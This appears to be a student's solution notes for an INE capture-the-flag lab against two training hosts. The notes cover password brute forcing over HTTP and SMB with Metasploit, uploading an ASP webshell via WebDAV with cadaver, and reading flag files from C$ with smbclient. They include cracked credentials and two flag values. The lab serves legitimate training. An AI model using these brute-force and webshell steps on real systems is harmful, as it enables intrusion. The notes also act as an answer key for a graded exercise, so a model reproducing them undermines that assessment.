## Completing Skill Check Labs
    Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

## Lab Environment
    In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at http://target1.ine.local and http://target2.ine.local.

    Objective: Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

    Useful files:

    /usr/share/metasploit-framework/data/wordlists/common_users.txt, 
    /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt,
    /usr/share/webshells/asp/webshell.asp
## Flags to Capture:

## Flag 1: User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)
    scanner/http/http_login
        bob:password_123321
    http://target1.ine.local/webdav/flag1.txt

## Flag 2: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)
    cadaver http://target1.ine.local/webdav/  
        bob:passwors_123321
    put /usr/share/webshells/asp/webshell.asp 

    4f066d1dff1b4269a2778211f034bfa4

## Flag 3: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)
    msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.2.23.40:445        - 10.2.23.40:445 - Success: '.\rooty:spongebob'
[+] 10.2.23.40:445        - 10.2.23.40:445 - Success: '.\demo:password1'
[+] 10.2.23.40:445        - 10.2.23.40:445 - Success: '.\auditor:hellokitty'
[+] 10.2.23.40:445        - 10.2.23.40:445 - Success: '.\administrator:pineapple' Administrator

smbclient -L //target2.ine.local -U administrator%pineapple                                                                                                                                                                            

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Shared          Disk      
        Shared2         Disk      
        Shared3         Disk      

    smbclient  //target2.ine.local/C$ -U administrator%pineapple 
        get flag3.txt

## Flag 4: The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)
    get Users/Administrator/Desktop/Flag4.txt
        359e79de8d1940b2ac61c8de749eb3cc


## Tools
    Nmap
    Hydra
    Cadaver
    Metasploit Framework